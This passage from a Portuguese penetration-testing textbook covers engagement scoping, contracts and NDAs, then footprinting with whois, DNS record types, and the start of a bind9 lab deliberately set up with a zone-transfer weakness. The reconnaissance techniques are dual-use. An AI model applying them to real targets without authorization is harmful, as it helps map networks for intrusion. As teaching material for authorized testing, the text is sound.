\taté\to\tlocal\tda\trede.\n•\t\nLimitações\timpostas\tpelo\tcliente\n\t–\tRestrições\tdo\tgênero:\to\tcliente\tdeseja\nque\tseja\ttestada\ta\tsua\trede\tDMZ,\tporém\tisso\tnão\tgarante\ta\tsegurança\tsobre\to\nseu\tfirewall\tou\tseu\tservidor\tVPN,\to\tque\tpode\tlevar\tao\tcomprometimento\tde\ntoda\ta\trede,\tmesmo\tque\tela\testeja\tprotegida.\tOutro\texemplo:\to\tpentest\tpoderá\nser\trealizado\tsomente\tcom\thora\tmarcada.\n•\t\nNovos\trecursos\n\t–\tDurante\to\tpentest\té\tinstalado\tum\tnovo\tfirewall\tno\tsistema\nou\té\tcriado\tum\tnovo\tdepartamento\tcom\tnovos\tequipamentos\tque\tdevem\tser\ntestados.\tEntão\tnão\tadianta\to\tauditor\tcorrigir\tvulnerabilidades\tno\tsistema\tse,\ndepois\tde\tuma\tsemana\tdo\tpentest,\to\tcliente\tinstala\tum\twebsite\tcom\tmódulos\nconhecidamente\tvulneráveis.\n•\t\nLimitações\tfinanceiras\n\t–\tO\tvalor\tdo\tcusto\tdo\tpentest\tpode\tse\ttornar\tuma\nlimitação\tcaso\tseja\tconsiderado\tmuito\talto\tpelo\tcliente.\tPor\texemplo:\tem\tum\nteste\tde\trede\tsem\tfio,\to\tauditor\tdeverá\testar\tfisicamente\tpresente\tno\tlocal\tdarede,\te\ta\talocação\tenvolverá\tcustos,\tcomo\tmoradia,\talimentação\te\toutros,\naumentado\to\tcusto\tdo\tpentest;\tdessa\tforma,\ta\tproposta\tde\tsegurança\tem\tredes\nsem\tfio\tpoderá\tser\tnegada\t(mesmo\tque\ta\trede\tapresente\tdiversas\tfalhas\tde\nsegurança).\tAinda,\tpode\tser\tnecessário\tque\to\tcliente\ttroque\ttodo\to\tseu\tparque\ntecnológico\tpara\tassegurar\to\thardening;\tessa\tproposta\tpoderá\tser\tnegada\te\ta\nrede\tcontinuará\tvulnerável.\n4.4\tContrato\tde\tacordo\nCom\tas\tinformações\tcoletadas\te\to\tescopo\tdo\tprojeto\tmontado,\tjá\té\tpossível\nelaborar\to\tcontrato\tde\tacordo.\tMais\tdetalhes\tsobre\tdiversos\ttipos\tde\tcontratos\npodem\tser\tconsultados\tno\tcapítulo\t16,\t“Documentação\ttécnica”.\tNesse\ttópico,\nvamos\tnos\tdeter\ta\tuma\tforma\tmais\tsimples\te\tgenérica\tsobre\to\tque\tum\tcontrato\nde\tacordo\tdeve\tconter.\n•\t\nMetodologia\taplicada\n\t–\tA\tmetodologia\tadotada\tpelo\tauditor\tdeve\tser\tvista\te\nrevisada\tpara\tatender\tao\tobjetivo\tdo\tpentest.\tPor\texemplo,\to\tcliente\topta\tpela\nmetodologia\tOSSTMM\te\tdeseja\tque\tataques\tde\tnegação\tde\tserviço\tsejam\nexcluídos.\tEssa\tdecisão\tdeve\testar\tclaramente\tdefinida\tno\tprojeto.\tIsso\nporque,\tcaso\to\tauditor\tfaça\tqualquer\tteste\tque\testeja\tfora\tdo\tescopo,\to\tcliente\npoderá\tpenalizá-lo\tjudicialmente\t(esse\tfator\tvai\tdepender\tdo\tque\tfoi\tfeito\npelo\tauditor).\n•\t\nAcordo\tde\tsigilo\n\t–\tAntes\tde\tser\tiniciado\to\tteste\tde\tintrusão,\tdeve\tser\tcriado\te\nassinado\to\ttermo\tde\tsigilo\t(NDA).\tO\tacordo\tde\tsigilo\té\tum\tacordo\tcom\ncláusulas\tgarantindo\ta\ttotal\tsegurança\tda\trede\tauditada,\tassim\tcomo\to\ncompromisso\tdo\tauditor\tem\tnão\tpublicar\tqualquer\ttipo\tde\tinformação\nencontrada\tna\trede\tdurante\to\tpentest.\n•\t\nContrato\tjudicial\n\t–\tAbsolutamente\ttudo\to\tque\tfor\tdefinido\tdurante\to\tescopo\ndo\tprojeto\tdeve\tser\tminuciosamente\tescrito\tem\tum\tcontrato\tjudicial\tválido.\tÉ\nde\textrema\timportância\tque\tambas\tas\tpartes\tleiam,\tentendam,\tconcordem\te\nassinem\to\tcontrato\tjudicial,\tpois\té\tpor\tmeio\tdeste\tque\tserá\tgarantido\tperante\na\tlei\tque\to\tpentest\trealizado\tpelo\tauditor\ttem\tpermissão\te\tconhecimento\tpor\nparte\tdo\tcliente,\te\tque\tas\tinformações\tobtidas\tdurante\to\tpentest\tnão\tserão\ndivulgadas,\tresguardando,\tportanto,\tauditor\te\tauditado.\tO\tcontrato\tjudicial\ndeve\tser\tassinado\te\treconhecido\tem\tcartório\tantes\tdo\tinício\tdo\tpentest.4.5\tLinha\tdo\ttempo\nElaborado\to\tescopo\tdo\tprojeto,\ta\tlinha\tdo\ttempo\tdeverá\tser\tdefinida\tdurante\ta\nrealização\tdo\tpentest,\tpara\tser\tuma\tespécie\tde\tcronograma\tdaquilo\tque\tfoi\nrealizado,\tcom\tos\tresultados\tobtidos.\tEssa\tetapa\tdeve\tser\tcuidadosamente\nplanejada,\ttendo\tem\tvista\tque\to\tteste\tde\tintrusão\tnão\tdeve\texceder\to\tprazo\ncombinado.\tSe\texceder,\tprovavelmente\té\tporque\to\tescopo\tdo\tprojeto\tfoi\tmal\nplanejado\te\tcom\tcerteza\tisso\tvai\tdesagradar\tseu\tcliente,\tque\thavia\tpedido\to\tteste\nem\tdeterminado\tprazo,\tmas\tnão\tteve\to\tprojeto\tentregue\ta\ttempo.\n1\n\tO\tplanejamento\tdo\tprojeto\tsegue\tas\tindicações\tpropostas\tpor\tShakeel\tAli\te\tTedi\tHeriyanto\t(p.\t61).CAPÍTULO\n\t5\nFootprinting\nA\tcoleta\tde\tinformações\t(ou\tfootprinting)\té\ta\tprimeira\tetapa\tque\tdeve\tocorrer\nem\tum\tpentest.\tO\treconhecimento\tconsiste\tem\tobter\ttodas\tas\tinformações\ta\nrespeito\tda\trede\t(topologia,\tmapeamento,\tservidores,\tfuncionários\tetc.).\tQuanto\nmais\tinformações\tcoletadas,\tmaior\ta\tprobabilidade\tde\tacesso\tao\tsistema\nauditado.\nTodas\tas\tinformações\trelacionadas\tao\tsegmento\tda\tempresa\t–\tservidores,\nroteadores,\tfirewalls,\thábitos\tdos\tfuncionários\te\tsua\tcapacitação,\tpessoas\nrelacionadas\tà\tempresa,\tempresas\tterceirizadas,\temails,\tFacebook,\ttelefones,\ninformação\tjogada\tno\tlixo\tetc.\t–\tauxiliam\tno\tprocesso\tde\tcoleta\tde\tinformações.\nPodemos\taplicar\ta\tengenharia\tsocial,\ta\tqual\tcontribuirá\tde\tforma\tsignificativa\ncom\to\taumento\tdas\tinformações\tpesquisadas.\tPor\tmeio\tdas\tinformações\tdo\nGoogle,\tdo\tYahoo\te\tde\toutros\tmecanismos\tde\tbusca,\tem\tpoucas\thoras\nconseguimos\tuma\tgama\tde\tinformações\tque\tpotencializa\to\tteste\tde\tintrusão.\nUm\tbom\tinício\tpara\tcoleta\tde\tinformações\té\tcomeçar\tpesquisando\tno\tsite\talvo.\nComece\tlendo\to\tsite,\tveja\tquais\tsão\tos\tdomínios\tassociados\tetc.\tObtenha\to\nmáximo\tde\tinformações\tque\tconseguir.\tCom\tcerteza\to\tleitor\tencontrará\temails\nde\tcontato,\tnomes\trelacionados\tà\tadministração\te\toutras\tinformações\tbem\ninteressantes.\tCom\tessas\tinformações\té\tpossível\tcriar\tuma\tlista\tde\tpalavras\tque\nservirá\tpara\tfuturos\tataques\t(como\tquebra\tde\tsistemas\tde\tlogin\t–\tHTTP,\tSMTP,\nWPA2\tetc).\tAcredite,\tsites\trevelam\tmuitas\tinformações\ta\trespeito\tdo\tnosso\talvo,\nvale\ta\tpena\tchecá-lo.\tUma\tdica\tque\tlhe\tdou\té\ttambém\tbuscar\tinformações\tdo\nsite\tem\trepositórios\tcomo\to\t\narchive.org,\t\nque\tarmazena\to\thistórico\tde\tsites\tna\ninternet.\tEntão\taquela\tpágina\tantiga\tde\t1995\tque\to\tnosso\tsite\tem\tteste\texibia\testá\narquivada\tem\t\narchive.org\n.\tO\tpassado\tde\tum\tsite\té\trevelador.\nCom\tas\tinformações\tbásicas\tenumeradas,\to\tpróximo\tpasso\tpara\tmontarmos\to\nnosso\tplano\tde\tataque\té\tcoletar\tinformações\ta\trespeito\tdo\tdomínio\ta\tser\ttestado.\nO\tdomínio\tvai\texibir\tdados\tpúblicos\tque\tpodem\tser\tde\tinteresse\tpara\tatacantes.\nRealizando\tuma\tbusca\tno\tdomínio\tdo\tnosso\talvo,\tobtemos\tinformações\tcomo\nemail\tdo\tresponsável,\tservidores\tDNS\t(que\tserão\tutilizados\tpara\tenumeraçãoDNS\te\ttransferência\tde\tzona\t–\tconteúdo\ta\tser\tvisto\tmais\tadiante\tneste\tcapítulo),\npaís\tetc.\tO\tcomando\t\nwhois\n\tdo\tLinux\tpode\tusado\tpara\tbuscar\te\tenumerar\ninformações\tde\tum\tdomínio\tem\tórgãos\tregulamentadores.\tMas\tantes\tde\tutilizá-\nlo,\tvamos\tentender\tcomo\tfunciona\ta\testrutura\tde\tdomínios\tna\tinternet.\nCada\tpaís\tpossui\tum\tórgão\tregulamentador\tde\tdomínios.\tPor\texemplo,\tno\tBrasil,\no\tresponsável\tpor\tregulamentar\tdomínios\té\to\t\nregistro.br\n.\tCada\tórgão\nregulamentador\té\tcontrolado\tpor\tuma\tentidade\tsuperior.\tPor\texemplo,\to\nregistro.br\n\té\tvinculado\tao\tLacnic\t(Entidade\tresponsável\tpelo\tgerenciamento\tde\ndomínios\tda\tAmérica\tLatina\t–\tFigura\t5.1).\tO\tórgão\tresponsável\tpelo\ngerenciamento\tde\ttodos\tos\tcontinentes\té\to\tIANA\t(a\tfutura\torganização\tserá\ta\nICANN).\nFigura\t5.1\t–\tCada\tcontinente\tpossui\tum\tórgão\tregulamentador\tpara\tos\tseus\ndomínios.\tFonte:\thttps://www.arin.net/knowledge/rirs/maps/rirmap.png.\nDigite\tno\tterminal\tdo\tKali\tLinux:\nroot@kali#\n\twhois\twww.site.com.br\nExemplo:\nroot@kali#\t\nwhois\twww.microsoft.com.br\n%\tCopyright\t(c)\tNic.br\n%\t\tThe\tuse\tof\tthe\tdata\tbelow\tis\tonly\tpermitted\tas\tdescribed\tin\n%\t\tfull\tby\tthe\tterms\tof\tuse\tat\thttp://registro.br/termo/en.html\t,\n%\t\tbeing\tprohibited\tits\tdistribution,\tcomercialization\tor\n%\t\treproduction,\tin\tparticular,\tto\tuse\tit\tfor\tadvertising\tor\n%\t\tany\tsimilar\tpurpose.\n%\t\t2015-03-27\t22:53:30\t(BRT\t-03:00)\ndomain:\t\t\t\t\t\tmicrosoft.com.browner:\t\t\t\t\t\t\tMicrosoft\tInformatica\tLtda\nownerid:\t\t\t\t\t060.316.817/0001-03\nresponsible:\tBenjamin\tOrndorff\ncountry:\t\t\t\t\tBR\nowner-c:\t\t\t\t\tBEORN2\nadmin-c:\t\t\t\t\tMICOR16\ntech-c:\t\t\t\t\t\tMSH22\nbilling-c:\t\t\tCOSCO3\nnserver:\t\t\t\tns1.msft.net\nnsstat:\t\t\t\t\t\t20150326\tAA\nnslastaa:\t\t\t\t20150326\nnserver:\t\t\t\tns2.msft.net\nnsstat:\t\t\t\t\t\t20150326\tAA\nnslastaa:\t\t\t\t20150326\nnserver:\t\t\t\tns3.msft.net\nnsstat:\t\t\t\t\t\t20150326\tAA\nnslastaa:\t\t\t\t20150326\nnserver:\t\t\t\tns4.msft.net\nnsstat:\t\t\t\t\t\t20150326\tAA\nnslastaa:\t\t\t\t20150326\ncreated:\t\t\t\t\t19970130\t#29325\nexpires:\t\t\t\t\t20160130\nchanged:\t\t\t\t\t20150128\nstatus:\t\t\t\t\t\tpublished\nnic-hdl-br:\t\tBEORN2\nperson:\t\t\t\t\tBenjamin\tOrndorff\ne-mail:\t\t\t\t\tdomains@microsoft.com\ncreated:\t\t\t\t\t20110810\nchanged:\t\t\t\t\t20140812\nnic-hdl-br:\t\tCOSCO3\nperson:\t\t\t\t\tCorporation\tService\tCompany\ne-mail:\t\t\t\t\tcctld-billing@cscinfo.com\ncreated:\t\t\t\t\t20081112\nchanged:\t\t\t\t\t20081112\nnic-hdl-br:\t\tMICOR16\nperson:\t\t\t\t\tMicrosoft\tCorporation\ne-mail:\t\t\t\t\tadmin@internationaladmin.com\ncreated:\t\t\t\t\t20101223\nchanged:\t\t\t\t\t20101223\nnic-hdl-br:\t\tMSH22\nperson:\t\t\t\t\tMSN\tHostmastere-mail:\t\t\t\t\tmsnhst@microsoft.com\ncreated:\t\t\t\t\t20040524\nchanged:\t\t\t\t\t20120517\n%\tSecurity\tand\tmail\tabuse\tissues\tshould\talso\tbe\taddressed\tto\n%\tcert.br,\thttp://www.cert.br/,\trespectivelly\tto\tcert@cert.br\n%\tand\tmail-abuse@cert.br\n%\n%\twhois.registro.br\taccepts\tonly\tdirect\tmatch\tqueries.\tTypes\n%\tof\tqueries\tare:\tdomain\t(.br),\tregistrant\t(tax\tID),\tticket,\n%\tprovider,\tcontact\thandle\t(ID),\tCIDR\tblock,\tIP\tand\tASN.\n\t\nNota:\n\to\t\nwhois\n\ttambém\tfunciona\tcom\tIPs.\tFaça\tum\tteste:\tAcesse\to\tsite\t\nwww.meuip.com.br\n\te\tdepois\nveja\tas\tinformações\tdo\tseu\tIP\tpor\tmeio\tdo\t\nwhois\n.\n\t\nAs\tinformações\tbásicas\tsão\texibidas\t(servidores\tDNS,\ta\tpessoa\tresponsável\tpor\naquele\tdomínio\tjuntamente\tcom\to\temail\tdela),\tserá\tnecessário\trealizar\ta\nenumeração\tDNS.\tA\tenumeração\tDNS\té\tum\tpasso\timportante\tpara\to\nmapeamento\tda\tinfraestrutura\tda\trede,\tpois\tcom\to\tDNS\tpodemos\tdescobrir\tquais\nsão\tos\tdomínios\tque\trespondem\tpor\tqual\tfaixa\tde\tIPs.\n5.1\tDNS\nDNS\té\to\tserviço\tresponsável\tpor\ttraduzir\tnomes\tem\tendereços\tIP\t(e\tvice-versa)\nde\tum\tdeterminado\tdomínio.\tPor\texemplo,\to\tdomínio\tpara\tos\tendereços\nwww.site.com.br\n,\tftp.site.com.br,\tsmtp.site.com.br\t\né\t\nsite.com.br\n.\nOs\tdomínios\tencontram-se\testruturados.\tPor\texemplo:\tquando\to\tnavegador\nacessa\tum\t\nwww.site.com.br\n,\tsão\tconsultados\tprimeiro\tos\tdomínios\tdentro\tde\t\n.br\n,\ndepois\tos\tdomínios\tdentro\tde\n\t.com\t\ne,\tenfim,\t\nsite.com.br\n,\tcomo\tuma\tárvore\nhierárquica.\nExemplo\tde\tuma\tinteração\tentre\tum\tcliente\tque\tfaz\tuma\tconsulta\ta\tum\tservidor\nDNS:\nCliente:\n–\tServidor,\tqual\té\to\tIP\tdo\t\nmta7.am0.yahoodns.net\n?\nServidor:\n–\tCliente,\to\tIP\té\t66.196.118.35.Cliente:\n–\tServidor,\tqual\té\to\tIP\tdo\t\nmta6.am0.yahoodns.net\n?\nServidor:\n–\tCliente,\to\tIP\té\t98.138.112.34.\nOs\tservidores\tDNS\tpodem\tser\tdos\tseguintes\ttipos:\n•\t\nSomente\tcache\n\t–\tUm\tservidor\tde\tcache\tresponde\tàs\tconsultas\tDNS\npesquisando\tem\toutros\tservidores\tDNS,\tarmazenando\ttemporariamente\tessa\nconsulta.\tSe\talgum\tcliente\trealizar\tuma\tnova\trequisição\tao\tmesmo\tDNS\t(que\njá\tfoi\tanteriormente\tconsultado),\tem\tvez\tde\to\tservidor\tde\tcache\tbuscar\nnovamente\to\tpedido\tem\talgum\toutro\tservidor\tDNS,\to\tservidor\tde\tcache\npesquisa\tapenas\tlocalmente,\tagilizando\ta\tconsulta.\tO\tbind\tutiliza\tessa\nconfiguração\tpor\tpadrão.\n•\t\nServidor\tmestre\t(servidor\tprimário)\t\n–\tUm\tservidor\tmestre\tcontém\tuma\nespécie\tde\tbanco\tde\tdados\tarmazenado\tem\tarquivos\tlocais\tcom\ttodas\tas\ninformações\tdaquele\tdomínio,\tassociando\tcada\tregistro\tao\tIP.\tÉ\ta\tfonte\noficial\tde\tinformações\tdaquele\tdomínio\te\tresponde\ta\tqualquer\tconsulta\tDNS\npara\taquele\tdomínio\tfeita\tpor\tclientes.\n•\t\nServidor\tescravo\t(servidor\tsecundário)\t\n–\tAssim\tcomo\to\tservidor\tmestre,\num\tservidor\tescravo\ttambém\té\tautorizado\ta\tresponder\tconsultas\tfeitas\tpor\nclientes\tàquele\tdomínio.\tPara\tpoder\tresponder\tas\tessas\tconsultas,\to\tservidor\nescravo\ttambém\tpossui\tesse\tbanco\tde\tdados\tque\tele\ttransfere\tdo\tmestre\tpor\nmeio\tde\tuma\ttécnica\tchamada\tde\ttransferência\tde\tzona.\tNa\ttransferência\tde\nzona,\ttodas\tas\tinformações\tdaquele\tdomínio\t(relação\tde\tregistros\te\tIPs)\tsão\nrepassadas\tao\tservidor\tescravo.\nAs\tinformações\ta\trespeito\tdo\tservidor\tDNS\tficam\tarmazenadas\tem\tcampos\ndenominados\tregistros.\tUm\tregistro\tassocia\tos\ttipos\tde\tDNS.\tPor\texemplo:\tum\nregistro\tDNS\tdo\ttipo\tA\tassocia\to\tnome\tDNS\ta\tum\tIP,\tum\tregistro\tdo\ttipo\nHINFO\tassocia\to\tnome\tDNS\ta\tinformações\tde\thardware.\n5.1.1\tTipos\tde\tregistro\tDNS\nO\tservidor\tDNS\tresponde\ta\tsolicitações\tgraças\taos\tregistros.\tSaber\tidentificar\tos\nprincipais\ttipos\tde\tregistro\tDNS\té\tfundamental\tpara\tentendermos\to\tque\testamos\ntestando.\tOs\tprincipais\ttipos\tde\tregistro\tsão:•\t\nNS\t(Name\tServer)\n\t–\tO\tregistro\t\nNS\n\tidentifica\tquem\tsão\tos\tservidores\tDNS\nprimário\te\tsecundário.\nExemplo:\nkali.com.br.\t\tIN\tNS\t\tnameserver1.kali.com.br\n•\t\nA\n\t–\tEndereço\tde\thost\t[Host\taddress\t(A)\tresource\trecord]\t–\tAssocia\tnomes\nDNS\tcom\tendereços\tIPv4.\nExemplos:\nkali.com.\t\t\t\t\t\tIN\t\tA\t\t127.0.0.1\nkali.com.br.\t\t\tIN\t\tA\t\t192.168.1.2\nkali2.com.br.\t\tIN\t\tA\t\t192.168.1.3\n•\t\nAAAA\n\t–\tEndereço\tde\thost\tIPv6\t[IPv6\thost\taddress\t(AAAA)]\t–\tAssocia\nnomes\tDNS\tcom\tendereços\tIPv6.\nExemplo:\nipv6_host1.kali.com.\tIN\tAAAA\t4321:0:1:2:3:4:567:89ab\n•\t\nCNAME\t(Canonical\tName)\t\n–\tMapeia\tum\talias\t(apelido)\tde\tum\tservidor\nDNS\tpara\toutro\tservidor\tDNS.\tO\tregistro\t\nCNAME\n\té\tutilizado\tquando\té\nnecessário\tcriar\tvários\tnomes\tpara\tum\túnico\tDNS.\tPor\texemplo:\to\tservidor\nweb\tda\tempresa\ttem\to\tendereço\tvirtual\t\nwww.servidor.com.br\n\t(IP\t1.1.1.1),\to\nservidor\tFTP\ttem\to\tendereço\t\nftp.servidor.com.br\n\t(IP\t1.1.1.1),\to\tservidor\nSMTP\ttem\to\tendereço\t\nsmtp.servidor.com.br\n\t(IP\t1.1.1.1).\tCom\to\t\nCNAME\n\té\npossível\tque\tos\ttrês\tservidores\tsejam\tuma\tmáquina\tsó\t(todos\tcom\to\tmesmo\nIP)\te\trespondam\tpor\tnomes\tdiferentes.\nExemplos:\nwww.servidor.com.br.\t\t\tCNAME\t\tservidor.com.br.\nftp.servidor.com.br.\t\t\tCNAME\t\tservidor.com.br.\nsmtp.servidor.com.br.\t\tCNAME\t\tservidor.com.br.\n•\t\nHINFO\t(Host\tInformation)\n\t–\tInformações\tdo\thost:\tCPU,\ttipo\te\tversão\tdo\nsistema\toperacional\tetc.\nExemplo:\nkali.com.br.\t\tHINFO\t\tINTEL-386\tLINUX\n•\t\nMX\t(Mail\tExchanger)\n\t–\tUtilizado\tpara\tarmazenar\tinformações\trelativas\ta\nservidores\tde\temail.Exemplos:\nkali.com.br.\t\tMX\t\t5\t\t\tmail1.kali.com.br\nkali.com.br.\t\tMX\t\t10\t\tmail2.kali.com.br\n\t\nNota:\n\tos\tnúmeros\tindicam\ta\tordem\tde\tpreferência\tdaquele\tservidor\tde\temail.\tNo\texemplo\tanterior,\nmail1\n\t(com\tprioridade\t5)\ttem\tmaior\tprioridade\tsobre\to\t\nmail2\n\t(com\tprioridade\t10).\n\t\n•\t\nPTR\t(Pointer)\n\t–\tÉ\tutilizado\tcom\to\tintuito\tde\tcriar\tzonas\treversas.\tO\tregistro\nPTR\n\trealiza\to\tmapeamento\tde\tum\tnúmero\tIP\tpara\tum\tnome\t(oposto\tao\nregistro\t\nA\n).\tAo\tcriar\tum\tregistro\tdo\ttipo\t\nA\n\tem\tuma\tzona\tdireta,\tvocê\tcria\to\nregistro\t\nPTR\n\tpara\tque\tuma\tconsulta\tao\tseu\tservidor\tDNS\tseja\testabelecida\ncom\tsucesso.\nExemplo:\n1.168.192.in-addr.arpa.\t\tPTR\t\thost.kali.com.br.\n•\t\nSOA\t(Start\tof\tauthority)\n\t–\tÉ\to\tregistro\tque\tdefine\tcaracterísticas\tde\tuma\nzona.\nExemplo:\n@\tIN\tSOA\tnameserver.kali.com.br.\tpostmaster.kali.com.br.\t(\n\t\t1;\t\t\t\t\t\t\tserial\tnumber\n\t\t3600;\t\t\t\trefresh\t[1h]\n\t\t600;\t\t\t\t\tretry\t[10m]\n\t\t86400;\t\t\texpire\t[1d]\n\t\t3600\t);\t\tmin\tTTL\t[1h]\n5.2\tLaboratório\t–\tEnumeração\tDNS\nPara\trealizar\tuma\tenumeração\tDNS\te\tdeterminar\ta\ttopologia\tda\trede\tem\nquestão,\tvamos\tconfigurar\to\tnosso\tpróprio\tservidor\tcom\tuma\tfalha\tde\ntransferência\tde\tzona.\nPrimeiro\tconfigure\ta\trede\tpara\ta\tfaixa\tde\tIP\t\n192.168.1.0/24\n.\tEssa\tconfiguração\npode\tser\tfeita\tno\troteador,\tconforme\tmostra\ta\tfigura\t5.2.Figura\t5.2\t–\tRede\tconfigurada\tpara\ta\tfaixa\tde\tIP\t192.168.1.0/24.\nO\tDebian\tdeverá\treceber\testaticamente\to\tIP\t192.168.1.102\tpor\tcausa\tdas\nconfigurações\tde\tDNS:\nroot@debian#\n\tkillall\tNetworkManager\nroot@debian#\n\tkillall\tdhclient\nroot@debian#\n\tifconfig\teth0\t0.0.0.0\nroot@debian#\n\tifconfig\teth0\t192.168.1.102\nroot@debian#\n\troute\tadd\tdefault\tgw\t192.168.1.1\teth0\n\t\nNota:\n\to\tprocesso\testático\trealizado\tmanualmente\tno\tDebian\ttambém\tpode\tser\tfeito\tpor\tmeio\tde\nrequisições\tDHCP.\tMas\tpara\tisso\té\tnecessário\tcertificar-se\tde\tque\to\tendereço\tMAC\tdo\tDebian\trecebe\no\tIP\t192.168.1.102.\tEsse\tprocesso\tpode\tser\trealizado\tno\troteador.\tComo\tcada\troteador\tpossui\tuma\nforma\tde\tconfiguração\tque\tdifere\ta\tcada\tfornecedor,\tencorajo\to\tleitor\ta\trealizar\tesse\tprocedimento\tde\nacordo\tcom\to\tseu\troteador.\n\t\nInstale\to\tbind9\t(servidor\tDNS)\tno\tDebian:\nroot@debian#\t\napt-get\tinstall\tbind9\nO\tarquivo\t\n/etc/bind/named.conf\n\tdeve\tconter\to\tseguinte:\ninclude\t\"/etc/bind/named.conf.options\";\ninclude\t\"/etc/bind/named.conf.local\";\ninclude\t\"/etc/bind/named.conf.default-zones\";\nzone\t\"kali.com.br\"\t{\n\t\t\t\ttype\tmaster;\n\t\t\t\tfile\t\"/etc/bind/db.kali.com.br\";\n};\nzone\t\"1.168.192.in-addr.arpa\"\t{\n\t\t\t\ttype\tmaster;\t\t\t\tfile\t\"/etc/bind/db.1.168.192\";\n};\nA\tconfiguração\tdo\tarquivo\t\n/etc/bind/named.conf\n\tcontém\tinformações\tbásicas\tdo\nDNS,\tcomo\tarquivos\tde\tconfiguração\tem\tgeral,\to\tnome\tDNS\te\tqual\tIP\testá\nassociado\tàquele\tDNS.\nO\tservidor\tDNS\tdeve\tarmazenar\tas\tinformações\tdo\tdomínio\tem\tuma\tespécie\tde\nbanco\tde\tdados.\tEsse\tbanco\tde\tdados\tcontendo\ta\trelação\tregistro\te\tIP\té\narmazenado\tnos\tarquivos\tde\tzona.\tExistem\tdois\ttipos\tde\tarquivo\tde\tzona:\tdireta\ne\treversa.\tO\tarquivo\tde\tzona\tdireta\té\tusado\tpara\tmapear\tnomes\tde\tcomputador\npara\tendereços\tIP\t(\n/etc/bind/db.kali.com.br\n),\tenquanto\to\tarquivo\tde\tzona\treversa\n(\n/etc/bind/db.1.168.192\n)\té\tusado\tpara\tmapear\tendereços\tIP\tpara\tnomes\tde\ncomputador.\nPrimeiro\tserá\tconfigurada\ta\tzona\tdireta.\nO\tarquivo\t\n/etc/bind/db.kali.com.br\n\tdeve\tter\to\tseguinte\tconteúdo:\n;\n;\tZone\tfile\tfor\tkali.com.br\n;\n$TTL\t86400\n@\t\tIN\t\tSOA\t\tkali.com.br.\t\troot.kali.com.br.\t(\n\t\t\t\t\t\t\t\t\t\t\t\t2012010100\t\t\t\t;\tserial\n\t\t\t\t\t\t\t\t\t\t\t\t7200\t\t\t\t\t\t\t\t\t\t;\trefresh\n\t\t\t\t\t\t\t\t\t\t\t\t1800\t\t\t\t\t\t\t\t\t\t;\tretry\n\t\t\t\t\t\t\t\t\t\t\t\t1209600\t\t\t\t\t\t\t;\texpire\n\t\t\t\t\t\t\t\t\t\t\t\t300\t)\t\t\t\t\t\t\t\t\t;\tminimum\n@\t\t\tIN\t\tNS\t\t\t\t\t\t\tns1\n@\t\t\tIN\t\tNS\t\t\t\t\t\t\tns2\n@\t\t\tIN\t\tNS\t\t\t\t\t\t\tfirewall\n@\t\t\tIN\t\tMX\t\t0\t\t\t\tmail\n@\t\t\tIN\t\tA\t\t\t\t\t\t\t\t192.168.1.102\nns1\t\t\t\t\tA\t\t\t\t\t\t\t\t192.168.1.102\nns2\t\t\t\t\tA\t\t\t\t\t\t\t\t192.168.1.102\nfirewall\tA\t\t\t\t\t\t\t\t192.168.1.102\nmail\t\t\t\tA\t\t\t\t\t\t\t\t192.168.1.102\nwww\t\t\t\t\tCNAME\t\t\t\t@\nftp\t\t\t\t\tCNAME\t\t\t\twww\npop3\t\t\t\tCNAME\t\t\t\tfirewall\nteste\t\t\tCNAME\t\t\t\tns1\nsmtp\t\t\t\tCNAME\t\t\t\tfirewallservidor2\t\tCNAME\t\t\t\t\t\tns2\nservidor1\t\tCNAME\t\t\t\t\t\tns1\nadmin\t\t\t\t\t\tCNAME\t\t\t\t\t\tfirewall\nadministracao\t\tCNAME\t\tns1\nrioclaro\t\t\tCNAME\t\t\t\t\t\twww\ndns\t\t\t\t\t\t\t\tCNAME\t\t\t\t\t\tns2\nO\tarquivo\t\n/etc/bind/db.kali.com.br\n\tcontém\tas\tconfigurações\tdo\tdomínio\nkali.com.br\n\t(zona\tdireta)\tfeitas\tpor\tmeio\tdos\tregistros\tDNS.\nO\tregistro\tSOA\tarmazena\tinformações\tcomo\texpiração\te\trenovação\tdo\tregistro.\nPodemos\tobservar\ttambém\tque\tos\tregistros\tprincipais\t(registros\t\nNS\n)\tsão\tde\nnome\t\nns1\n,\t\nns2\n\te\t\nfirewall\n\t(\nns1.kali.com.br\n,\t\nns2.kali.com.br\n,\t\nfirewall.kali.com.br)\n,\nque\tcorrespondem\tao\tIP\t192.168.1.102.\nNesse\tarquivo\tde\tconfiguração\thá\toutros\tregistros\tque\tsão\tapelidos\t(\nCNAME\n)\npara\toutros\t(FTP,\tPOP3\te\tSMTP).\nUma\tvez\tconfigurada\ta\tzona\tdireta,\to\tleitor\tdeverá\tconfigurar\ta\tzona\treversa.\nO\tarquivo\t\n/etc/bind/db.1.168.192\n\tdeve\tter\to\tseguinte\tconteúdo:\n;\n;\tReverse\tzone\tfile\tfor\tdominio.com.br\n;\n$TTL\t86400\n@\t\tIN\t\t\tSOA\t\tkali.com.br.\t\troot.kali.com.br.\t(\n\t\t\t\t\t\t\t\t\t\t\t\t\t2012010100\t\t\t\t;\tserial\n\t\t\t\t\t\t\t\t\t\t\t\t\t7200\t\t\t\t\t\t\t\t\t\t;\trefresh\n\t\t\t\t\t\t\t\t\t\t\t\t\t1800\t\t\t\t\t\t\t\t\t\t;\tretry\n\t\t\t\t\t\t\t\t\t\t\t\t\t1209600\t\t\t\t\t\t\t;\texpire\n\t\t\t\t\t\t\t\t\t\t\t\t\t300\t)\t\t\t\t\t\t\t\t\t;\tminimum\n@\t\t\tIN\t\t\t\t\t\t\tNS\t\t\tns1.kali.com.br.\n@\t\t\tIN\t\t\t\t\t\t\tNS\t\t\tns2.kali.com.br.\n@\t\t\tIN\t\t\t\t\t\t\tNS\t\t\tfirewall.kali.com.br.\n102\tPTR\t\t\t\t\t\tkali.com.br.\n102\tPTR\t\t\t\t\t\tns1.kali.com.br.\n102\tPTR\t\t\t\t\t\tns2.kali.com.br.\n102\tPTR\t\t\t\t\t\tfirewall.kali.com.br\n102\tPTR\t\t\t\t\t\tmail.kali.com.br.\nA\tzona\treversa\tvai\tassociar\tos\tregistros\tdefinidos\tna\tzona\tdireta\tao\tfinal\tdo\tIP.\nPor\texemplo,\to\tdomínio\t\nns1.kali.com.br\n\testá\tassociado\tao\tIP\t192.168.1.102\n(linha\t\n102\tPTR\tns1.kali.com.br\n.\n).•\tApós\tconfigurar\tos\tdois\tarquivos,\treinicie\to\tBIND:\nroot@debian#\n\tservice\tbind9\tstop\nroot@debian#\n\tservice\tbind9\tstart\n•\tVerifique\tse\ta\tconfiguração\testá\tcorreta:\nroot@debian#\n\tnam